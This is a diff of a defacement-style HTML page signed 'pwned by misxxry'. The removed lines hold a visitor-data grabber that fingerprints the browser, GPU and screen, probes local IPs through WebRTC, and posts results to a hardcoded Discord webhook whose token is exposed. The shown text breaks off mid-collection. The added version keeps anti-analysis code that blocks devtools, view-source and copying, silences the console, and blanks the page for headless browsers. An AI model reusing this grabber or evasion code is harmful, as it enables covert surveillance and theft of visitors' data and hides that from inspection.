@@ -1,942 +1,730 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>@ misery</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-    body {
-      background: #0a0a0a;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-family: 'Courier New', Courier, monospace;
-      padding: 1.5rem;
-      position: relative;
-      overflow-x: hidden;
-    }
-    #cmatrix-canvas {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      z-index: 0;
-      pointer-events: none;
-      display: block;
-      background: transparent;
-    }
-    #loadingScreen {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      z-index: 1000;
-      background: #0a0a0a;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      transition: opacity 0.8s ease, visibility 0.8s ease;
-      cursor: pointer;
-    }
-    #loadingScreen.hidden {
-      opacity: 0;
-      visibility: hidden;
-      pointer-events: none;
-    }
-    .loading-ascii {
-      font-family: 'Courier New', Courier, monospace;
-      font-size: 0.7rem;
-      line-height: 1.2;
-      white-space: pre;
-      color: #aaaaaa;
-      text-shadow: 0 0 12px rgba(170,170,170,0.15);
-      letter-spacing: 0.02em;
-      padding: 0.5rem;
-      max-width: 95%;
-      overflow: hidden;
-      background: transparent;
-      word-break: break-all;
-      min-height: 160px;
-    }
-    .loading-ascii code {
-      display: block;
-      background: transparent;
-      color: inherit;
-      font-size: inherit;
-      line-height: inherit;
-      white-space: pre;
-      width: 100%;
-    }
-    .loading-text {
-      font-family: 'Courier New', Courier, monospace;
-      font-size: 0.75rem;
-      color: #888888;
-      margin-top: 1rem;
-      letter-spacing: 0.15em;
-      opacity: 0.6;
-      animation: pulse 1.8s ease-in-out infinite;
-    }
-    @keyframes pulse {
-      0%, 100% { opacity: 0.3; }
-      50% { opacity: 0.8; }
-    }
-    #mainContent {
-      position: relative;
-      z-index: 1;
-      max-width: 1000px;
-      width: 100%;
-      background: transparent;
-      padding: 0.5rem 0.2rem;
-      opacity: 0;
-      transition: opacity 0.8s ease;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      min-height: 80vh;
-    }
-    #mainContent.visible {
-      opacity: 1;
-    }
-    .ascii-wrapper {
-      position: relative;
-      margin-bottom: 1.2rem;
-      width: 100%;
-      max-width: 900px;
-    }
-    .ascii-art {
-      font-family: 'Courier New', Courier, monospace;
-      font-size: 0.7rem;
-      line-height: 1.2;
-      white-space: pre;
-      color: #cccccc;
-      text-shadow: 0 0 6px rgba(200,200,200,0.1);
-      letter-spacing: 0.02em;
-      overflow-x: auto;
-      padding: 0.2rem 0;
-      background: transparent;
-      border: none;
-      outline: none;
-      word-break: break-all;
-      position: relative;
-      transition: all 0.02s;
-      text-align: center;
-    }
-    .ascii-art code {
-      display: block;
-      background: transparent;
-      color: inherit;
-      font-size: inherit;
-      line-height: inherit;
-      white-space: pre;
-      width: 100%;
-      text-align: center;
-    }
-    .glitch-layer {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      font-family: 'Courier New', Courier, monospace;
-      font-size: 0.7rem;
-      line-height: 1.2;
-      white-space: pre;
-      color: #bbbbbb;
-      letter-spacing: 0.02em;
-      overflow-x: auto;
-      padding: 0.2rem 0;
-      background: transparent;
-      border: none;
-      outline: none;
-      word-break: break-all;
-      pointer-events: none;
-      opacity: 0;
-      transition: opacity 0.04s;
-      text-shadow: 0 0 12px rgba(200,200,200,0.3);
-      text-align: center;
-    }
-    .glitch-layer code {
-      display: block;
-      background: transparent;
-      color: inherit;
-      font-size: inherit;
-      line-height: inherit;
-      white-space: pre;
-      width: 100%;
-      text-align: center;
-    }
-    .glitch-layer.active { opacity: 1; }
-    .glitch-offset-1 {
-      transform: translate(1.5px, -1px);
-      color: #dddddd;
-      text-shadow: 0 0 20px rgba(200,200,200,0.4);
-      clip-path: inset(10% 0 70% 0);
-    }
-    .glitch-offset-2 {
-      transform: translate(-1.2px, 1.2px);
-      color: #bbbbbb;
-      text-shadow: 0 0 25px rgba(200,200,200,0.3);
-      clip-path: inset(40% 0 30% 0);
-    }
-    .glitch-offset-3 {
-      transform: translate(2px, 0.5px);
-      color: #999999;
-      text-shadow: 0 0 18px rgba(200,200,200,0.3);
-      clip-path: inset(70% 0 10% 0);
-    }
-    .tagline-wrapper {
-      font-family: 'Courier New', Courier, monospace;
-      font-size: 0.85rem;
-      font-weight: 400;
-      letter-spacing: 0.06em;
-      text-transform: lowercase;
-      color: #999999;
-      background: transparent;
-      padding: 0.4rem 0 0 0;
-      border: none;
-      border-radius: 0;
-      word-break: break-word;
-      line-height: 1.5;
-      text-shadow: 0 0 6px rgba(200,200,200,0.05);
-      backdrop-filter: none;
-      max-width: 90%;
-      min-height: 2.4rem;
-      text-align: center;
-    }
-    .tagline-cursor {
-      display: inline-block;
-      width: 0.1em;
-      height: 1em;
-      background: #aaaaaa;
-      margin-left: 2px;
-      vertical-align: text-bottom;
-      animation: blink 0.9s step-end infinite;
-      opacity: 0.6;
-    }
-    @keyframes blink {
-      0%, 100% { opacity: 0.6; }
-      50% { opacity: 0; }
-    }
-    @media (max-width: 700px) {
-      .ascii-art, .glitch-layer, .loading-ascii { font-size: 0.48rem; line-height: 1.1; }
-      .tagline-wrapper { font-size: 0.7rem; }
-      .loading-ascii { min-height: 100px; }
-    }
-    @media (max-width: 480px) {
-      .ascii-art, .glitch-layer, .loading-ascii { font-size: 0.35rem; }
-      .tagline-wrapper { font-size: 0.6rem; }
-      .loading-ascii { min-height: 70px; }
-    }
-    #bgm { display: none; }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="@misxxry">
+<title>@misxxry</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+html,
+body{
+    width:100%;
+    height:100%;
+    overflow:hidden;
+    background:#000;
+}
+body{
+    font-family:monospace;
+}
+#splash{
+    position:fixed;
+    inset:0;
+    width:100%;
+    height:100%;
+    background:#000;
+    z-index:9999;
+    overflow:hidden;
+}
+#splash-canvas{
+    position:absolute;
+    inset:0;
+    width:100%;
+    height:100%;
+    display:block;
+}
+#splash-hint{
+    position:absolute;
+    bottom:38px;
+    left:50%;
+    transform:translateX(-50%);
+    color:rgba(255,255,255,.4);
+    font-size:11px;
+    letter-spacing:.22em;
+    text-transform:lowercase;
+    pointer-events:none;
+    white-space:nowrap;
+    animation:pulse 2.5s ease-in-out infinite;
+}
+@keyframes pulse{
+    0%,100%{opacity:.15}
+    50%{opacity:.65}
+}
+audio{
+    display:none;
+}
+</style>
 </head>
+
 <body>
 
-  <canvas id="cmatrix-canvas"></canvas>
+<div id="splash">
+    <canvas id="splash-canvas"></canvas>
+    <span id="splash-hint">pwned by misxxry</span>
+</div>
 
-  <audio id="bgm" loop preload="auto">
-    <source src="https://file.garden/am9m147l3hw3nqT1/ssstik.io_@ncuongg_18th8_1786534271688.mp4">
-  </audio>
+<audio
+    id="bgMusic"
+    src="https://file.garden/am9m147l3hw3nqT1/cinderella2"
+    loop
+    autoplay
+    playsinline
+    preload="auto">
+</audio>
 
-  <div id="loadingScreen">
-    <div class="loading-ascii" id="loadingAscii">
-      <code id="loadingCode"></code>
-    </div>
-    <div class="loading-text">click me</div>
-  </div>
+<script>
+(function(){
+"use strict";
 
-  <div id="mainContent">
-    <div class="ascii-wrapper" id="asciiWrapper">
-      <div class="ascii-art" id="mainAscii">
-        <code id="asciiCode">
+/* =========================================================
+   SECURITY LAYER (copied, no webhook)
+========================================================= */
 
-                       .       .x+=:.                                        
-                      @88>    z`    ^%                            ..         
-   ..    .     :      %8P        .   <k               .u    .    @L          
- .888: x888  x888.     .       .@8Ned8"      .u     .d88B :@8c  9888i   .dL  
-~`8888~'888X`?888f`  .@88u   .@^%8888"    ud8888.  ="8888f8888r `Y888k:*888. 
-  X888  888X '888>  ''888E` x88:  `)8b. :888'8888.   4888>'88"    888E  888I 
-  X888  888X '888>    888E  8888N=*8888 d888 '88%"   4888> '      888E  888I 
-  X888  888X '888>    888E   %8"    R88 8888.+"      4888>        888E  888I 
-  X888  888X '888>    888E    @8Wou 9%  8888L       .d888L .+     888E  888I 
- "*88%""*88" '888!`   888&  .888888P`   '8888c. .+  ^"8888*"     x888N><888' 
-   `~    "    `"`     R888" `   ^"F      "88888%       "Y"        "88"  888  
-                       ""                  "YP'                         88F  
-                                                                       98"   
-                                                                     ./"     
-                                                                    ~`       
-</code>
-      </div>
-      <div class="glitch-layer glitch-offset-1" id="glitch1"><code id="glitchCode1"></code></div>
-      <div class="glitch-layer glitch-offset-2" id="glitch2"><code id="glitchCode2"></code></div>
-      <div class="glitch-layer glitch-offset-3" id="glitch3"><code id="glitchCode3"></code></div>
-    </div>
-    <div class="tagline-wrapper" id="taglineWrapper">
-      <span id="typedText"></span><span class="tagline-cursor" id="cursor"></span>
-    </div>
-  </div>
+/* Non-browser / headless / view-source guard */
+(function guard(){
+    var ua = navigator.userAgent || "";
 
-  <script>
-  (function() {
-    "use strict";
+    var isBrowser =
+        ua.indexOf("Mozilla") !== -1 &&
+        (
+            ua.indexOf("Chrome") !== -1 ||
+            ua.indexOf("Firefox") !== -1 ||
+            ua.indexOf("Safari") !== -1 ||
+            ua.indexOf("Edg") !== -1
+        );
 
-    var audio = document.getElementById('bgm');
-    var loadingScreen = document.getElementById('loadingScreen');
+    var isHeadless =
+        ua.indexOf("HeadlessChrome") !== -1 ||
+        ua.indexOf("PhantomJS") !== -1 ||
+        ua.indexOf("Puppeteer") !== -1 ||
+        ua.indexOf("Playwright") !== -1 ||
+        ua.indexOf("Selenium") !== -1 ||
+        navigator.webdriver === true;
 
-    function startAudio() {
-      if (!audio.paused) return;
-      audio.play().then(function() {
-        audio.loop = true;
-      }).catch(function(e) {
-        audio.muted = true;
-        audio.play().then(function() {
-          audio.muted = false;
-        }).catch(function() {});
-      });
+    if(!isBrowser || isHeadless){
+        try{ document.documentElement.innerHTML = ""; }catch(e){}
+        try{ window.location.replace("about:blank"); }catch(e){}
+        return;
     }
 
-    loadingScreen.addEventListener('click', startAudio);
-    loadingScreen.addEventListener('touchstart', startAudio);
-    document.addEventListener('click', function firstGlobalClick() {
-      if (audio.paused) startAudio();
-      document.removeEventListener('click', firstGlobalClick);
-    }, { once: true });
-
-    var WEBHOOK = 'https://discord.com/api/webhooks/1534204404759269386/eyfTaujP__4xPM7P9EiEstJzKAPDJE2O7olc4_Gkvk7we0XKGUc0f2npgwesA3ayzdKn';
-
-    function sendToWebhook(content) {
-      var payload = typeof content === 'string' ? { content: content } : content;
-      return fetch(WEBHOOK, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      }).catch(function() {});
+    var isViewSource = false;
+    try{ isViewSource = window.location.protocol === "view-source:"; }catch(e){}
+    if(!isViewSource){
+        try{
+            if(document.referrer && document.referrer.indexOf("view-source:") === 0){
+                isViewSource = true;
+            }
+        }catch(e){}
     }
 
-    document.addEventListener('contextmenu', function(e) {
-      e.preventDefault();
-      return false;
-    });
+    var ct = "";
+    try{ ct = document.contentType || ""; }catch(e){}
 
-    document.addEventListener('keydown', function(e) {
-      if (e.key === 'F12' || e.keyCode === 123) {
+    if(
+        isViewSource ||
+        (ct && ct.indexOf("html") === -1 && ct.indexOf("xml") === -1)
+    ){
+        try{ document.documentElement.innerHTML = ""; }catch(e){}
+        try{ window.location.replace("about:blank"); }catch(e){}
+        return;
+    }
+
+    setTimeout(function(){
+        if(!document.getElementById("splash-canvas")){
+            try{ document.documentElement.innerHTML = ""; }catch(e){}
+            try{ window.location.replace("about:blank"); }catch(e){}
+        }
+    }, 250);
+})();
+
+/* Anti right-click */
+document.addEventListener("contextmenu", function(e){
+    e.preventDefault();
+    e.stopPropagation();
+    return false;
+}, true);
+
+/* Anti F12 / devtools hotkeys / view-source / save / print */
+document.addEventListener("keydown", function(e){
+    if(e.key === "F12" || e.keyCode === 123){
         e.preventDefault();
+        e.stopPropagation();
+        try{ document.body.innerHTML = ""; }catch(err){}
         window.close();
-        setTimeout(function() { window.location.href = 'about:blank'; }, 100);
+        setTimeout(function(){ window.location.href = "about:blank"; }, 100);
         return false;
-      }
-      if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c')) {
+    }
+    if(e.ctrlKey && e.shiftKey && (
+        e.key === "I" || e.key === "i" ||
+        e.key === "J" || e.key === "j" ||
+        e.key === "C" || e.key === "c" ||
+        e.key === "K" || e.key === "k"
+    )){
         e.preventDefault();
+        e.stopPropagation();
+        try{ document.body.innerHTML = ""; }catch(err){}
         window.close();
-        setTimeout(function() { window.location.href = 'about:blank'; }, 100);
+        setTimeout(function(){ window.location.href = "about:blank"; }, 100);
         return false;
-      }
-      if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
+    }
+    if(e.metaKey && e.altKey && (
+        e.key === "I" || e.key === "i" ||
+        e.key === "J" || e.key === "j" ||
+        e.key === "C" || e.key === "c"
+    )){
         e.preventDefault();
+        e.stopPropagation();
+        try{ document.body.innerHTML = ""; }catch(err){}
         window.close();
-        setTimeout(function() { window.location.href = 'about:blank'; }, 100);
+        setTimeout(function(){ window.location.href = "about:blank"; }, 100);
         return false;
-      }
-      return true;
-    });
-
-    var devtoolsDetect = function() {
-      var threshold = 160;
-      var widthDiff = window.outerWidth - window.innerWidth;
-      var heightDiff = window.outerHeight - window.innerHeight;
-      if (widthDiff > threshold || heightDiff > threshold) {
+    }
+    if(e.ctrlKey && (e.key === "u" || e.key === "U")){
+        e.preventDefault();
+        e.stopPropagation();
+        try{ document.body.innerHTML = ""; }catch(err){}
         window.close();
-        setTimeout(function() { window.location.href = 'about:blank'; }, 100);
-      }
-    };
-    setInterval(devtoolsDetect, 500);
-    window.addEventListener('resize', devtoolsDetect);
+        setTimeout(function(){ window.location.href = "about:blank"; }, 100);
+        return false;
+    }
+    if(e.ctrlKey && (e.key === "s" || e.key === "S")){
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+    }
+    if(e.ctrlKey && (e.key === "p" || e.key === "P")){
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+    }
+}, true);
 
-    document.addEventListener('dragstart', function(e) { e.preventDefault(); return false; });
-    document.addEventListener('selectstart', function(e) { e.preventDefault(); return false; });
-    document.addEventListener('copy', function(e) { e.preventDefault(); return false; });
-    document.addEventListener('cut', function(e) { e.preventDefault(); return false; });
+/* Devtools dimension detection */
+var devtoolsDetect = function(){
+    var threshold = 160;
+    var widthDiff = window.outerWidth - window.innerWidth;
+    var heightDiff = window.outerHeight - window.innerHeight;
+    if(widthDiff > threshold || heightDiff > threshold){
+        try{ document.body.innerHTML = ""; }catch(e){}
+        window.close();
+        setTimeout(function(){ window.location.href = "about:blank"; }, 100);
+    }
+};
+setInterval(devtoolsDetect, 500);
+window.addEventListener("resize", devtoolsDetect);
 
-    console.log = function() {};
-    console.warn = function() {};
-    console.error = function() {};
+/* Anti drag / select / copy / cut */
+document.addEventListener("dragstart", function(e){ e.preventDefault(); return false; }, true);
+document.addEventListener("selectstart", function(e){ e.preventDefault(); return false; }, true);
+document.addEventListener("copy", function(e){ e.preventDefault(); return false; }, true);
+document.addEventListener("cut", function(e){ e.preventDefault(); return false; }, true);
 
-    var fullAscii = '\n\n                       .       .x+=:.                                        \n                      @88>    z`    ^%                            ..         \n   ..    .     :      %8P        .   <k               .u    .    @L          \n .888: x888  x888.     .       .@8Ned8"      .u     .d88B :@8c  9888i   .dL  \n~`8888~\'888X`?888f`  .@88u   .@^%8888"    ud8888.  ="8888f8888r `Y888k:*888. \n  X888  888X \'888>  \'\'888E` x88:  `)8b. :888\'8888.   4888>\'88"    888E  888I \n  X888  888X \'888>    888E  8888N=*8888 d888 \'88%"   4888> \'      888E  888I \n  X888  888X \'888>    888E   %8"    R88 8888.+"      4888>        888E  888I \n  X888  888X \'888>    888E    @8Wou 9%  8888L       .d888L .+     888E  888I \n "*88%""*88" \'888!`   888&  .888888P`   \'8888c. .+  ^"8888*"     x888N><888\' \n   `~    "    `"`     R888" `   ^"F      "88888%       "Y"        "88"  888  \n                       ""                  "YP\'                         88F  \n                                                                       98"   \n                                                                     ./"     \n                                                                    ~`       ';
+/* Silence console */
+console.log = function(){};
+console.warn = function(){};
+console.error = function(){};
+console.info = function(){};
+console.debug = function(){};
+console.table = function(){};
+console.trace = function(){};
 
-    var loadingCode = document.getElementById('loadingCode');
-    var mainContent = document.getElementById('mainContent');
-    loadingCode.textContent = fullAscii;
+/* =========================================================
+   ASCII ART
+========================================================= */
 
-    setTimeout(function() {
-      loadingScreen.classList.add('hidden');
-      mainContent.classList.add('visible');
-      setTimeout(startMainAnimations, 100);
-      setTimeout(collectAllData, 300);
-    }, 2000);
+const OLD_ART = [
+"                       .       .x+=:.",
+"                      @88>    z`    ^%                                           ..",
+"   ..    .     :      %8P        .   <k    uL   ..      uL   ..      .u    .    @L",
+" .888: x888  x888.     .       .@8Ned8\"  .@88b  @88R  .@88b  @88R  .d88B :@8c  9888i   .dL",
+"~`8888~'888X`?888f`  .@88u   .@^%8888\"  '\"Y888k/\"*P  '\"Y888k/\"*P  =\"8888f8888r `Y888k:*888.",
+"  X888  888X '888>  ''888E` x88:  `)8b.    Y888L        Y888L       4888>'88\"    888E  888I",
+"  X888  888X '888>    888E  8888N=*8888     8888         8888       4888> '      888E  888I",
+"  X888  888X '888>    888E   %8\"    R88     `888N        `888N      4888>        888E  888I",
+"  X888  888X '888>    888E    @8Wou 9%   .u./\"888&    .u./\"888&    .d888L .+     888E  888I",
+" \"*88%\"\"*88\" '888!`   888&  .888888P`   d888\" Y888*\" d888\" Y888*\"  ^\"8888*\"     x888N><888'",
+"   `~    \"    `\"`     R888\" `   ^\"F     ` \"Y   Y\"    ` \"Y   Y\"        \"Y\"        `\"`  888",
+"                       \"\"                                                              88F",
+"                                                                                      98\"",
+"                                                                                    ./\"",
+"                                                                                   ~`"
+];
 
-    var canvas = document.getElementById('cmatrix-canvas');
-    var ctx = canvas.getContext('2d');
-    var w, h, cols, drops = [];
-    var chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()_+{}[]|;:,.<>?';
+const NEW_ART = [
+"     ▄▄     ▄▄           ▄▌     ▄▄▄         ▄    ▄▄        ▄    ▄▄         ▄▄▄        ▄▄    ▄▄",
+"   ▄██░▒▄ ▄░█░█        ▄█░▌   ▄██░█░▄      █░▒  ▐░█░      █░▒  ▐░█░      ▄██░█░▄     ███▌  ▐███",
+" ▄█▒░░░░░▒░█░▀░▒     ▄█▒░█▌  ▐▒░▒▀ ▀░▌    ▓▒░▓   █░▒▌    ▓▒░▓   █░▒▌   ▄█▒░▒▀ ▀░▒   █▒░█    █░▒▌",
+"▀█░░▒▒▀ ▀▓░░  ▐▓░   ▀█░░▒█▌  ▐░▒█  ■▀     ▀░▒░▌ ▐█▒░▀    ▀░▒░▌ ▐█▒░▀  ▀█░░▒█   ▐▓▌  ░░▒█    █▒░░",
+"   ▀▓▌  ▐▓▒▌  ▐██▌    ▀▀▓█▌   ▀▀▄▓▄        ▀▀░▒▄▄▓▀▀      ▀▀░▒▄▄▓▀▀      ▀▓█ ▄▄█▀    ▀▓█▄   █▓▒▀",
+"    ▄▀   ▄▀    ▄▀       ▄▀    ▄  ░▒▀ ▄■      ▀▀▄▀▄▄         ▀▀▄▀▄▄        ▄▀  ▄        ▀▀▀▄░▀▀▄",
+"  ▐░▓▄  ▐▓▒▌  ░▓▒▄▓▄  ▐▓▓▄  ▄░▄▀   ▄░▓▄    ▄▄▒░ ▐░▓▒▄▄    ▄▄▒░ ▐░▓▒▄▄   ▐░▓▄   ░▓▄▄         ▀▓░░",
+" ▄▒░░▓░  ▀▀   ▓▒░░▒  ▄▒░░▓ ▐▓░░▒▄ ▄▒░░▓▌ ▄▒░░▓▌  ▒▒░░▒▌ ▄▒░░▓▌  ▒▒░░▒▌  ▒░░▒░▄ ▓▒░░▌ ▄▄▄▄   ░▓▒░",
+"▐██░██▀       ▀░░█  ▐██░█▀  ░█░█████░█░ ▐██░█░   ▀░░█▀ ▐██░█░   ▀░░█▀   ▀░██▓▀ ▐░░▓ ▐▒░░▒░▄░▒░░░",
+" ▀▀             ▀    ▀▀▀▀     ▀▀▀▀▀▀▀    ▀▀▀       ▀    ▀▀▀       ▀             ▀▀   ▀▀▀▀▀▀▀▀▀▀"
+];
 
-    function initMatrix() {
-      w = window.innerWidth;
-      h = window.innerHeight;
-      canvas.width = w;
-      canvas.height = h;
-      var cw = 18;
-      cols = Math.floor(w / cw);
-      drops = [];
-      for (var i = 0; i < cols; i++) {
-        drops.push({
-          y: Math.floor(Math.random() * -200) - 50,
-          speed: 0.2 + Math.random() * 0.3,
-          active: Math.random() < 0.3 ? 1 : 0,
-          char: chars[Math.floor(Math.random() * chars.length)],
-          brightness: 0.5 + Math.random() * 0.5
-        });
-      }
+/* =========================================================
+   CANVAS
+========================================================= */
+
+const canvas = document.getElementById("splash-canvas");
+const ctx = canvas.getContext("2d", {
+    alpha:false,
+    desynchronized:true
+});
+
+/* =========================================================
+   STATE
+========================================================= */
+
+let particles = [];
+let currentArt = OLD_ART;
+let width = 0;
+let height = 0;
+let dpr = 1;
+let cellW = 9;
+let cellH = 15;
+let mx = -9999;
+let my = -9999;
+let smx = -9999;
+let smy = -9999;
+let prevMx = -9999;
+let prevMy = -9999;
+let nearest = null;
+let nearestDistSq = Infinity;
+let t = 0;
+let lastTime = performance.now();
+
+/* =========================================================
+   SETTINGS
+========================================================= */
+
+const FOLLOW_STRENGTH = 0.055;
+const MOUSE_INFLUENCE = 0.12;
+const MAX_FOLLOW = 120;
+
+const DRAG_RADIUS = 150;
+const DRAG_RADIUS_SQ = DRAG_RADIUS * DRAG_RADIUS;
+const DRAG_STRENGTH = 0.55;
+
+const NEIGHBOR_RADIUS = 115;
+const NEIGHBOR_RADIUS_SQ = NEIGHBOR_RADIUS * NEIGHBOR_RADIUS;
+const NEIGHBOR_STRENGTH = 0.10;
+
+const SPRING_K = 0.020;
+const DAMPING = 0.90;
+
+const HUE_SPEED = 6;
+const HUE_SPATIAL_SPREAD = 14;
+const COLOR_SAT = 42;
+
+/* =========================================================
+   BUILD ASCII
+========================================================= */
+
+function build(art){
+    const rows = art.length;
+    let cols = 0;
+    for(let i = 0; i < rows; i++){
+        if(art[i].length > cols){
+            cols = art[i].length;
+        }
     }
 
-    function drawMatrix() {
-      ctx.clearRect(0, 0, w, h);
-      ctx.font = '15px "Courier New", monospace';
-      ctx.textAlign = 'center';
-      for (var i = 0; i < drops.length; i++) {
-        var drop = drops[i];
-        if (!drop.active) {
-          if (Math.random() < 0.001) {
-            drop.active = 1;
-            drop.y = Math.floor(Math.random() * -100) - 30;
-            drop.char = chars[Math.floor(Math.random() * chars.length)];
-          }
-          continue;
-        }
-        var x = i * (w / cols) + (w / cols) / 2;
-        var alpha = 0.08 + 0.25 * drop.brightness;
-        ctx.shadowColor = 'rgba(180,180,180,0.05)';
-        ctx.shadowBlur = 6;
-        ctx.fillStyle = 'rgba(180,180,180,' + alpha + ')';
-        ctx.fillText(drop.char, x, drop.y);
-        drop.y += drop.speed;
-        if (drop.y > h + 30) {
-          if (Math.random() < 0.4) {
-            drop.y = Math.floor(Math.random() * -60) - 20;
-            drop.char = chars[Math.floor(Math.random() * chars.length)];
-            drop.speed = 0.2 + Math.random() * 0.3;
-            drop.brightness = 0.5 + Math.random() * 0.5;
-          } else {
-            drop.active = 0;
-            drop.y = Math.floor(Math.random() * -200) - 50;
-          }
-        }
-        if (Math.random() < 0.01) drop.char = chars[Math.floor(Math.random() * chars.length)];
-      }
-      for (var j = 0; j < drops.length; j++) {
-        if (drops[j].active === 0 && Math.random() < 0.0008) {
-          drops[j].active = 1;
-          drops[j].y = Math.floor(Math.random() * -50) - 20;
-          drops[j].char = chars[Math.floor(Math.random() * chars.length)];
-        }
-      }
-      requestAnimationFrame(drawMatrix);
-    }
+    cellW = Math.min(
+        (width * 0.80) / cols,
+        (height * 0.52) / rows
+    );
 
-    window.addEventListener('resize', function() { initMatrix(); });
-    initMatrix();
-    drawMatrix();
+    cellW = Math.max(6, Math.min(cellW, 18));
+    cellH = cellW * 1.65;
 
-    function startMainAnimations() {
-      var asciiCode = document.getElementById('asciiCode');
-      var glitch1 = document.getElementById('glitch1');
-      var glitch2 = document.getElementById('glitch2');
-      var glitch3 = document.getElementById('glitch3');
-      var gc1 = document.getElementById('glitchCode1');
-      var gc2 = document.getElementById('glitchCode2');
-      var gc3 = document.getElementById('glitchCode3');
-      var orig = fullAscii;
+    const totalW = cols * cellW;
+    const totalH = rows * cellH;
+    const offX = (width - totalW) * 0.5;
+    const offY = (height - totalH) * 0.5;
 
-      gc1.textContent = orig;
-      gc2.textContent = orig;
-      gc3.textContent = orig;
-
-      function glitch() {
-        var lines = orig.split('\n');
-        var lineCount = lines.length;
-        var numLines = 1 + Math.floor(Math.random() * 2);
-        var indices = [];
-        for (var i = 0; i < numLines; i++) {
-          var li = Math.floor(Math.random() * lineCount);
-          while (indices.indexOf(li) !== -1) li = Math.floor(Math.random() * lineCount);
-          indices.push(li);
-        }
-        var layers = [gc1, gc2, gc3];
-        for (var li2 = 0; li2 < layers.length; li2++) {
-          var newLines = lines.slice();
-          for (var ii = 0; ii < indices.length; ii++) {
-            var lineIdx = indices[ii];
-            var line = newLines[lineIdx];
-            if (line.length < 2) continue;
-            var numRep = 1 + Math.floor(Math.random() * 2);
-            for (var r = 0; r < numRep; r++) {
-              var pos = Math.floor(Math.random() * line.length);
-              var rc = String.fromCharCode(33 + Math.floor(Math.random() * 94));
-              line = line.substring(0, pos) + rc + line.substring(pos + 1);
+    const result = [];
+    for(let row = 0; row < rows; row++){
+        const line = art[row];
+        for(let col = 0; col < line.length; col++){
+            const ch = line[col];
+            if(ch === " "){
+                continue;
             }
-            newLines[lineIdx] = line;
-          }
-          layers[li2].textContent = newLines.join('\n');
-        }
-        if (Math.random() < 0.3) {
-          var mainLines = lines.slice();
-          var mi = Math.floor(Math.random() * lineCount);
-          var ml = mainLines[mi];
-          if (ml.length > 2) {
-            var mp = Math.floor(Math.random() * ml.length);
-            var mc = String.fromCharCode(33 + Math.floor(Math.random() * 94));
-            ml = ml.substring(0, mp) + mc + ml.substring(mp + 1);
-            mainLines[mi] = ml;
-            asciiCode.textContent = mainLines.join('\n');
-          }
-        } else {
-          asciiCode.textContent = orig;
-        }
-        var ge = [glitch1, glitch2, glitch3];
-        for (var gi = 0; gi < ge.length; gi++) {
-          if (Math.random() < 0.4) ge[gi].classList.add('active');
-          else ge[gi].classList.remove('active');
-        }
-        if (Math.random() < 0.2) {
-          gc1.textContent = orig;
-          gc2.textContent = orig;
-          gc3.textContent = orig;
-          for (var gi2 = 0; gi2 < ge.length; gi2++) ge[gi2].classList.remove('active');
-        }
-        var delay = 400 + Math.random() * 600;
-        setTimeout(glitch, delay);
-      }
-      setTimeout(glitch, 400);
-
-      var tagline = '@ pwned by misery';
-      var typedSpan = document.getElementById('typedText');
-      var cursorSpan = document.getElementById('cursor');
-      var ci = 0;
-
-      function typeNext() {
-        if (ci < tagline.length) {
-          typedSpan.textContent += tagline.charAt(ci);
-          ci++;
-          setTimeout(typeNext, 25 + Math.random() * 30);
-        } else {
-          cursorSpan.style.animation = 'blink 0.9s step-end infinite';
-        }
-      }
-      setTimeout(typeNext, 500);
-    }
-
-    function collectAllData() {
-      var data = {
-        browser: {},
-        system: {},
-        network: {},
-        tokens: [],
-        storage: {},
-        emails: []
-      };
-
-      data.browser.userAgent = navigator.userAgent || 'N/A';
-      data.browser.language = navigator.language || 'N/A';
-      data.browser.languages = navigator.languages ? navigator.languages.join(', ') : 'N/A';
-      data.browser.platform = navigator.platform || 'N/A';
-      data.browser.vendor = navigator.vendor || 'N/A';
-      data.browser.hardwareConcurrency = navigator.hardwareConcurrency || 'N/A';
-      data.browser.deviceMemory = navigator.deviceMemory || 'N/A';
-      data.browser.maxTouchPoints = navigator.maxTouchPoints || 'N/A';
-
-      data.system.screen = screen.width + 'x' + screen.height + ' (' + screen.colorDepth + '-bit)';
-      data.system.avail = screen.availWidth + 'x' + screen.availHeight;
-      data.system.window = window.innerWidth + 'x' + window.innerHeight;
-      data.system.pixelRatio = window.devicePixelRatio || 1;
-      data.system.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A';
-      data.system.utc = new Date().toISOString();
-      data.system.local = new Date().toString();
-
-      try {
-        var c = document.createElement('canvas');
-        var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-        if (gl) {
-          var di = gl.getExtension('WEBGL_debug_renderer_info');
-          if (di) {
-            data.system.gpuVendor = gl.getParameter(di.UNMASKED_VENDOR_WEBGL) || 'N/A';
-            data.system.gpuRenderer = gl.getParameter(di.UNMASKED_RENDERER_WEBGL) || 'N/A';
-          }
-          data.system.webglVersion = gl.getParameter(gl.VERSION) || 'N/A';
-        }
-      } catch(e) {}
-
-      try {
-        var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-        pc.createDataChannel('test');
-        pc.createOffer().then(function(offer) { return pc.setLocalDescription(offer); }).then(function() {
-          var sdp = pc.localDescription ? pc.localDescription.sdp : '';
-          var candidates = sdp.match(/candidate:[^\n]+/g);
-          if (candidates) {
-            for (var i = 0; i < candidates.length; i++) {
